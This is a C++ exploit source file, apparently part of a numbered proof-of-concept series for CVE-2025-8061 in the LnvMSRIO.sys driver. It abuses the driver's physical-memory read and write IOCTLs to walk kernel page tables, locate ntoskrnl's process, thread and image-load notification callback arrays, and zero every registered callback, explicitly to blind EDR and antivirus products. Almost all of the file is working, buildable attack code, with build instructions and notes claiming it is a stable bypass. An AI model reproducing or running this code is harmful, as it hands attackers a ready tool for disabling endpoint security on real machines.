/*
 * 09_callback_kill.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — Kernel Callback Removal
 *
 * Goal: zero out registered kernel notification callbacks used by EDR/AV products,
 *       blinding them to process creation, thread creation, and image load events.
 *
 * Background
 * ──────────
 * EDR drivers register callbacks via:
 *   PsSetCreateProcessNotifyRoutine[Ex]  → PspCreateProcessNotifyRoutineArray
 *   PsSetCreateThreadNotifyRoutine[Ex]   → PspCreateThreadNotifyRoutineArray
 *   PsSetLoadImageNotifyRoutine[Ex]      → PspLoadImageNotifyRoutineArray
 *
 * Each array holds up to 64 EX_CALLBACK_ROUTINE_BLOCK* entries (stored as
 * ExFastRef with refcount in low 4 bits).  When the kernel creates a process,
 * thread, or loads an image, it iterates the relevant array and calls each
 * non-null callback.
 *
 * Zeroing an entry removes that EDR's notification entirely — the driver
 * code remains loaded, but it stops receiving events.  No PatchGuard check
 * covers these arrays (Microsoft chose not to protect them via KPP).
 *
 * Finding the arrays without symbols
 * ────────────────────────────────────
 * PsSetCreateProcessNotifyRoutine is an exported ntoskrnl function.
 * Its body contains a call (E8 xx xx xx xx) to the internal function that
 * modifies PspCreateProcessNotifyRoutineArray.  That internal function
 * accesses the array via a LEA/MOV RIP-relative instruction.
 * We scan the first 512 bytes of PsSetCreateProcessNotifyRoutine for the
 * pattern:
 *   4C 8D xx [imm32]       — LEA r, [RIP+imm32] pointing into ntoskrnl .data
 *   or
 *   48 8D xx [imm32]       — same, 64-bit LEA
 *   or indirect via a CALL to a sub-function and then scan that sub-function.
 *
 * Simpler alternate: scan from the exported function for a RIP-relative LEA
 * that targets a known-size region in ntoskrnl's .data section, contains
 * ≥1 valid EX_CALLBACK_ROUTINE_BLOCK* (kernel pointer, ExFastRef style).
 *
 * Arrays:
 *   PspCreateProcessNotifyRoutineArray  found via PsSetCreateProcessNotifyRoutine
 *   PspCreateThreadNotifyRoutineArray   found via PsSetCreateThreadNotifyRoutine
 *   PspLoadImageNotifyRoutineArray      found via PsSetLoadImageNotifyRoutine
 *
 * Each array element is 8 bytes (EX_FAST_REF pointer, refcount in low 4 bits).
 * A null entry = 0.  A non-null entry has bits[63:4] = kernel pointer.
 *
 * Stability
 * ─────────
 * PatchGuard does NOT protect these arrays (confirmed on Win10 19041–Win11 26100).
 * No code bytes are modified — only data pointers are zeroed.
 * → This is among the MOST STABLE kernel-level EDR bypass techniques.
 *
 * RESTORE: the original pointer values are saved and restored on exit.
 *          Leaving callbacks zeroed is also safe (no BSOD risk) but the
 *          EDR's driver may re-register on next process event, so restore
 *          is good practice for a clean demo.
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:09_callback_kill.exe 09_callback_kill.cpp
 *      /link kernel32.lib
 *
 * _EPROCESS offsets (x64, Win10 19041 → Win11 26100+)
 *   +0x028  DirectoryTableBase (CR3)
 *   +0x440  UniqueProcessId
 *   +0x5A8  ImageFileName char[15]
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <algorithm>
using std::min;

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME       L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ   0x9c406104u
#define IOCTL_PHYS_WRITE  0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    return true;
}

// ─── Physical R/W ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn   { UINT64 PA; DWORD AccessSize; DWORD Count; };
struct PhysWriteIn8 { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

static bool PhysWriteU64(uint64_t pa, uint64_t val)
{
    PhysWriteIn8 in = { pa, 1, 8, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── RAM bound ───────────────────────────────────────────────────────────────


// ─── Physical memory range enumeration (VMware-safe) ─────────────────────────
// Reads valid RAM extents from the Windows kernel's physical memory resource
// map so we never request MmMapIoSpace() on VMware device MMIO pages.
// HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated
// is a CM_RESOURCE_LIST with CmResourceTypeMemory (Type=8) entries.
//
// CM_PARTIAL_RESOURCE_DESCRIPTOR on x64:
//   +0   BYTE  Type
//   +1   BYTE  ShareDisposition
//   +2   WORD  Flags
//   +4   LARGE_INTEGER Start    (8 bytes)
//   +12  ULONG Length           (4 bytes)
//   +16  (padding to 20-byte record)

struct PhRange { uint64_t base, size; };

static int GetPhysRanges(PhRange *out, int cap)
{
    HKEY hKey = nullptr;
    const char *kpath =
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, kpath, 0, KEY_READ, &hKey)
            != ERROR_SUCCESS)
        return 0;

    DWORD type = 0, cb = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &cb);
    if (!cb) { RegCloseKey(hKey); return 0; }

    auto *rbuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + 8);
    if (!rbuf) { RegCloseKey(hKey); return 0; }
    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, rbuf, &cb)
            != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, rbuf);
        RegCloseKey(hKey);
        return 0;
    }
    RegCloseKey(hKey);

    int n = 0;
    DWORD off = 0;
    if (off + 4 <= cb) {
        DWORD lcnt = *(DWORD*)(rbuf + off); off += 4;
        for (DWORD l = 0; l < lcnt && off + 16 <= cb; l++) {
            off += 8;               // InterfaceType(4) + BusNumber(4)
            off += 4;               // Version(2) + Revision(2)
            if (off + 4 > cb) break;
            DWORD dcnt = *(DWORD*)(rbuf + off); off += 4;
            for (DWORD d = 0; d < dcnt && off + 20 <= cb; d++, off += 20) {
                if (rbuf[off] != 8) continue;   // CmResourceTypeMemory = 8
                LARGE_INTEGER st = {};
                st.LowPart  = *(DWORD*)(rbuf + off + 4);
                st.HighPart = *(LONG*) (rbuf + off + 8);
                ULONG len   = *(DWORD*)(rbuf + off + 12);
                if (n < cap) {
                    out[n].base = (uint64_t)st.QuadPart;
                    out[n].size = (uint64_t)len;
                    n++;
                }
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, rbuf);
    return n;
}

static uint64_t GetSystemCR3()
{
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    if (n == 0) {
        // Fallback: use actual installed RAM with NO extra buffer
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        ranges[0].base = 0x100000;
        ranges[0].size = 0x07F00000;  // [1 MB, 128 MB) — System EPROCESS always here
        n = 1;
    }
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;
    uint64_t cr3 = 0;
    for (int ri = 0; ri < n && !cr3; ri++) {
        uint64_t rbase = ranges[ri].base;
        uint64_t rend  = ranges[ri].base + ranges[ri].size;
        if (rbase < 0x100000) rbase = 0x100000;
        rbase = (rbase + 0xFFFFF) & ~(uint64_t)0xFFFFF;  // align up to 1 MB
        for (uint64_t pa = rbase; pa < rend && !cr3; pa += 1<<20) {
            bool any_ok = false;
            for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
                if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
                else memset(buf+pg, 0, 0x1000);
            }
            if (!any_ok) continue;
            for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
                if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
                if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
                uint64_t c = *(uint64_t*)(buf+off+0x028);
                if (c && !(c & 0xFFF)) { cr3 = c; break; }
            }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return cr3;
}

// ─── Page table walk ─────────────────────────────────────────────────────────

static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    auto rd = [](uint64_t pa) -> uint64_t {
        uint64_t v = 0; PhysReadU64(pa, &v); return v;
    };
    uint64_t pml4e = rd((cr3 & ~0xFFFULL) | (((va >> 39) & 0x1FF) << 3));
    if (!(pml4e & 1)) return 0;
    uint64_t pdpte = rd((pml4e & 0x000FFFFFFFFFF000ULL) | (((va >> 30) & 0x1FF) << 3));
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL<<7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    uint64_t pde = rd((pdpte & 0x000FFFFFFFFFF000ULL) | (((va >> 21) & 0x1FF) << 3));
    if (!(pde & 1)) return 0;
    if (pde & (1ULL<<7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    uint64_t pte = rd((pde & 0x000FFFFFFFFFF000ULL) | (((va >> 12) & 0x1FF) << 3));
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

// ─── Kernel virtual read ──────────────────────────────────────────────────────

static void KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
{
    auto *dst = (uint8_t*)buf;
    DWORD done = 0;
    while (done < len) {
        DWORD chunk = min(len - done, (DWORD)(0x1000u - ((va + done) & 0xFFFu)));
        uint64_t pa = VaToPa(cr3, va + done);
        if (pa) PhysRead(pa, dst + done, chunk);
        done += chunk;
    }
}

// ─── ntoskrnl: get export VA + .data section bounds ──────────────────────────

struct NtInfo {
    uint64_t base;
    uint64_t data_va;
    uint32_t data_size;
};

typedef LONG (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);

static bool GetNtoskrnlInfo(uint64_t cr3, NtInfo *out)
{
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll"),
                                            "NtQuerySystemInformation");
    if (!NtQSI) return false;

    ULONG sz = 1 << 18;
    auto *buf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
    while (NtQSI(11, buf, sz, &sz) == (LONG)0xC0000004)
        buf = (uint8_t*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, sz *= 2);

    struct MOD { HANDLE sec; PVOID mb, ib; ULONG sz, fl, loi, ioi, lc, oft; char path[256]; };
    ULONG n = *(ULONG*)buf;
    auto *mods = (MOD*)(buf + sizeof(ULONG));

    out->base      = 0;
    out->data_va   = 0;
    out->data_size = 0;

    for (ULONG i = 0; i < n; i++) {
        const char *nm = mods[i].path + mods[i].oft;
        if (_stricmp(nm, "ntoskrnl.exe") != 0 && _stricmp(nm, "ntkrnlmp.exe") != 0)
            continue;
        out->base = (uint64_t)(uintptr_t)mods[i].ib;
        break;
    }
    HeapFree(GetProcessHeap(), 0, buf);
    if (!out->base) return false;

    // Read PE headers to find .data section
    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, out->base, hdrbuf, sizeof(hdrbuf));

    auto *dos = (IMAGE_DOS_HEADER*)hdrbuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto *nt  = (IMAGE_NT_HEADERS64*)(hdrbuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    WORD  nsec    = nt->FileHeader.NumberOfSections;
    WORD  optsz   = nt->FileHeader.SizeOfOptionalHeader;
    DWORD sec_off = dos->e_lfanew + 4 + 0x14 + optsz;

    for (WORD s = 0; s < nsec && s < 32; s++) {
        DWORD o = sec_off + s * 40;
        if (o + 40 > sizeof(hdrbuf)) break;
        const char *name  = (const char*)(hdrbuf + o);
        DWORD vsize = *(DWORD*)(hdrbuf + o + 0x08);
        DWORD vrva  = *(DWORD*)(hdrbuf + o + 0x0C);
        DWORD chars = *(DWORD*)(hdrbuf + o + 0x24);
        // Writable, non-executable → .data
        if (strncmp(name, ".data", 5) == 0 && (chars & 0xC0000000) == 0xC0000000) {
            out->data_va   = out->base + vrva;
            out->data_size = vsize;
        }
    }
    return out->data_va != 0;
}

// ─── Resolve export VA from ntoskrnl ─────────────────────────────────────────

static uint64_t GetNtExport(uint64_t cr3, uint64_t ntos_base, const char *name)
{
    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, ntos_base, hdrbuf, sizeof(hdrbuf));

    auto *dos = (IMAGE_DOS_HEADER*)hdrbuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto *nt = (IMAGE_NT_HEADERS64*)(hdrbuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    auto &dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress) return 0;

    DWORD expSize = (dir.Size < 0x80000u) ? dir.Size : 0x80000u;
    auto *expbuf = (uint8_t*)VirtualAlloc(nullptr, expSize + 0x1000,
                                           MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!expbuf) return 0;
    KernelRead(cr3, ntos_base + dir.VirtualAddress, expbuf, expSize);

    auto *exp = (IMAGE_EXPORT_DIRECTORY*)expbuf;
    DWORD base_rva = dir.VirtualAddress;
    uint64_t result = 0;

    for (DWORD i = 0; i < exp->NumberOfNames && !result; i++) {
        DWORD offN = exp->AddressOfNames - base_rva + i * 4;
        if (offN + 4 > expSize) break;
        DWORD nameRva = *(DWORD*)(expbuf + offN);
        DWORD nameOff = nameRva - base_rva;
        if (nameOff >= expSize) continue;
        if (_stricmp((char*)(expbuf + nameOff), name) != 0) continue;

        DWORD offO = exp->AddressOfNameOrdinals - base_rva + i * 2;
        if (offO + 2 > expSize) break;
        WORD ord = *(WORD*)(expbuf + offO);
        DWORD offF = exp->AddressOfFunctions - base_rva + (DWORD)ord * 4;
        if (offF + 4 > expSize) break;
        DWORD funcRva = *(DWORD*)(expbuf + offF);
        result = ntos_base + funcRva;
    }
    VirtualFree(expbuf, 0, MEM_RELEASE);
    return result;
}

// ─── Find callback array VA via RIP-relative LEA scan ────────────────────────
//
// Strategy: read the first 512 bytes of the exported Ps* function.
// Scan for LEA Rx, [RIP+imm32] (opcodes 4C/48/4D/49 8D xx imm32) where
// the target VA falls in ntoskrnl's .data section.
// An EX_CALLBACK array must contain ≥1 valid kernel pointer (non-null entry).
// Accept the first candidate whose first entry is either 0 or a kernel VA.
//
// Also follow the first CALL (E8 imm32) encountered, scanning the callee too,
// because PsSetCreateProcessNotifyRoutine calls an internal helper on recent
// builds.

static uint64_t FindCallbackArray(uint64_t cr3, uint64_t func_va,
                                   uint64_t data_va, uint32_t data_size,
                                   const char *label)
{
    // We may scan the exported function and one level of called sub-functions
    uint64_t scan_targets[4] = { func_va, 0, 0, 0 };
    int      n_targets = 1;

    for (int t = 0; t < n_targets; t++) {
        uint64_t scan_va = scan_targets[t];
        if (!scan_va) continue;

        uint8_t code[512] = {};
        KernelRead(cr3, scan_va, code, sizeof(code));

        for (int i = 0; i < (int)sizeof(code) - 7; i++) {
            uint8_t pfx = code[i];
            uint8_t op  = code[i+1];

            // Follow first CALL (E8 imm32) to scan callee too
            if (code[i] == 0xE8 && n_targets < 4) {
                int32_t rel = *(int32_t*)(code + i + 1);
                uint64_t callee = scan_va + i + 5 + (int64_t)rel;
                if ((callee >> 48) == 0xFFFF) {
                    bool dup = false;
                    for (int k = 0; k < n_targets; k++)
                        if (scan_targets[k] == callee) { dup = true; break; }
                    if (!dup) scan_targets[n_targets++] = callee;
                }
            }

            // LEA with REX.W: 48/49/4C/4D 8D /r imm32
            if ((pfx & 0xF0) != 0x40) continue;  // must be REX prefix
            if (op != 0x8D) continue;             // must be LEA

            uint8_t modrm = code[i+2];
            if ((modrm & 0xC7) != 0x05) continue; // mod=00, rm=101 = RIP-relative

            int32_t  imm32  = *(int32_t*)(code + i + 3);
            uint64_t target = scan_va + i + 7 + (int64_t)imm32;

            // Must be inside ntoskrnl's .data
            if (target < data_va || target + 8 > data_va + data_size) continue;

            // Read first 8 entries of the candidate array
            uint64_t entries[8] = {};
            KernelRead(cr3, target, entries, sizeof(entries));

            // Each entry must be 0 (empty) or a kernel EX_FAST_REF (bit 3:0 = refcount)
            // A real array has at least one non-zero entry that is a kernel VA
            bool has_kernel_entry = false;
            bool all_valid = true;
            for (int k = 0; k < 8; k++) {
                uint64_t e = entries[k];
                if (e == 0) continue;
                uint64_t ptr = e & ~0xFULL;
                if ((ptr >> 48) == 0xFFFF) { has_kernel_entry = true; continue; }
                all_valid = false; break;
            }
            if (!all_valid) continue;
            if (!has_kernel_entry) continue;  // all-zero array is not useful

            printf("    [+] %s array: VA=0x%016llX  (scan offset +0x%X, target in LEA)\n",
                   label, target, i);
            return target;
        }
    }
    printf("    [-] %s array not found\n", label);
    return 0;
}

// ─── Zero callback entries in one array ──────────────────────────────────────

#define MAX_CALLBACKS 64   // Windows supports max 64 entries per array

struct CbSaved {
    uint64_t array_va;
    uint64_t orig[MAX_CALLBACKS];
    int      count;  // how many non-zero entries we zeroed
};

static int ZeroCallbacks(uint64_t cr3, uint64_t array_va,
                          const char *label, CbSaved *save)
{
    save->array_va = array_va;
    save->count    = 0;

    if (!array_va) return 0;

    printf("  [*] %s @ 0x%016llX\n", label, array_va);
    int zeroed = 0;

    for (int i = 0; i < MAX_CALLBACKS; i++) {
        uint64_t entry_va = array_va + (uint64_t)i * 8;
        uint64_t entry_pa = VaToPa(cr3, entry_va);
        if (!entry_pa) continue;

        uint64_t val = 0;
        if (!PhysReadU64(entry_pa, &val)) continue;
        save->orig[i] = val;

        if (!val) continue;  // already empty

        uint64_t ptr = val & ~0xFULL;
        printf("    [%02d] 0x%016llX  ptr=0x%016llX  (kernel callback)\n",
               i, val, ptr);

        if (!PhysWriteU64(entry_pa, 0)) {
            printf("    [-] Write slot %d failed\n", i);
            continue;
        }
        uint64_t rb = 0xFFFF;
        PhysReadU64(entry_pa, &rb);
        if (rb == 0) {
            zeroed++;
            save->count++;
        } else {
            printf("    [!] Slot %d write did not stick (HVCI?)\n", i);
        }
    }

    printf("  [+] %s: zeroed %d callbacks\n\n", label, zeroed);
    return zeroed;
}

// ─── Restore ─────────────────────────────────────────────────────────────────

static void RestoreCallbacks(uint64_t cr3, const CbSaved *save, const char *label)
{
    if (!save->array_va) return;
    int restored = 0;
    for (int i = 0; i < MAX_CALLBACKS; i++) {
        if (!save->orig[i]) continue;
        uint64_t entry_va = save->array_va + (uint64_t)i * 8;
        uint64_t entry_pa = VaToPa(cr3, entry_va);
        if (!entry_pa) continue;
        if (PhysWriteU64(entry_pa, save->orig[i])) restored++;
    }
    printf("  [+] %s: restored %d entries\n", label, restored);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 09 - Kernel Callback Removal ===\n\n");

    printf("[*] Stability: SAFE — only zeros .data pointers, no code bytes modified.\n");
    printf("    PatchGuard does NOT protect callback arrays.\n");
    printf("    Original values saved and restored on exit.\n\n");

    if (!OpenDevice()) return 1;
    printf("[+] Device opened\n");

    printf("[*] Scanning for System EPROCESS / CR3...\n");
    uint64_t cr3 = GetSystemCR3();
    if (!cr3) {
        printf("[-] System CR3 not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] System CR3 = 0x%016llX\n\n", cr3);

    printf("[*] Getting ntoskrnl info...\n");
    NtInfo nt = {};
    if (!GetNtoskrnlInfo(cr3, &nt)) {
        printf("[-] Failed to get ntoskrnl base / .data bounds\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] ntoskrnl base  = 0x%016llX\n", nt.base);
    printf("[+] .data section  = 0x%016llX  size=0x%X\n\n", nt.data_va, nt.data_size);

    // Exported functions whose bodies reference the callback arrays
    static const struct { const char *export_sym; const char *label; } targets[] = {
        { "PsSetCreateProcessNotifyRoutine", "PspCreateProcessNotifyRoutineArray" },
        { "PsSetCreateThreadNotifyRoutine",  "PspCreateThreadNotifyRoutineArray"  },
        { "PsSetLoadImageNotifyRoutine",     "PspLoadImageNotifyRoutineArray"     },
    };
    static const int N = (int)(sizeof(targets) / sizeof(targets[0]));

    uint64_t array_vas[N] = {};

    printf("[*] Locating callback arrays via exported Ps* functions:\n");
    for (int i = 0; i < N; i++) {
        uint64_t fn = GetNtExport(cr3, nt.base, targets[i].export_sym);
        if (!fn) {
            printf("    [-] %s export not found\n", targets[i].export_sym);
            continue;
        }
        printf("    [*] %s @ 0x%016llX\n", targets[i].export_sym, fn);
        array_vas[i] = FindCallbackArray(cr3, fn, nt.data_va, nt.data_size,
                                          targets[i].label);
    }

    // Check we found at least one
    int found = 0;
    for (int i = 0; i < N; i++) if (array_vas[i]) found++;
    if (!found) {
        printf("\n[-] No callback arrays located — ntoskrnl layout may differ.\n");
        printf("    Try using PDB-based offsets from WinDbg: dt nt!PspCreateProcessNotifyRoutine\n");
        CloseHandle(g_dev); return 1;
    }

    // Zero all callbacks in each found array
    CbSaved saved[N] = {};
    int total_zeroed = 0;

    printf("\n[*] Zeroing callback entries:\n\n");
    for (int i = 0; i < N; i++) {
        total_zeroed += ZeroCallbacks(cr3, array_vas[i], targets[i].label, &saved[i]);
    }

    if (total_zeroed == 0) {
        printf("[~] No callbacks were zeroed (no EDR registered, or HVCI blocked writes).\n");
    } else {
        printf("[+] %d callback slots cleared — EDR process/thread/image notifications DISABLED.\n",
               total_zeroed);
        printf("[+] EDRs that relied solely on these callbacks can no longer:\n");
        printf("    - detect process creation (no PsCreateProcessNotify)\n");
        printf("    - detect thread injection (no PsCreateThreadNotify)\n");
        printf("    - detect PE injection via image load (no PsLoadImageNotify)\n");
    }

    printf("\n[*] Press Enter to RESTORE all callbacks and exit...\n");
    getchar();

    printf("\n[*] Restoring callback arrays:\n");
    for (int i = 0; i < N; i++)
        RestoreCallbacks(cr3, &saved[i], targets[i].label);

    CloseHandle(g_dev);
    printf("[+] Done.\n");
    return (total_zeroed > 0) ? 0 : 1;
}
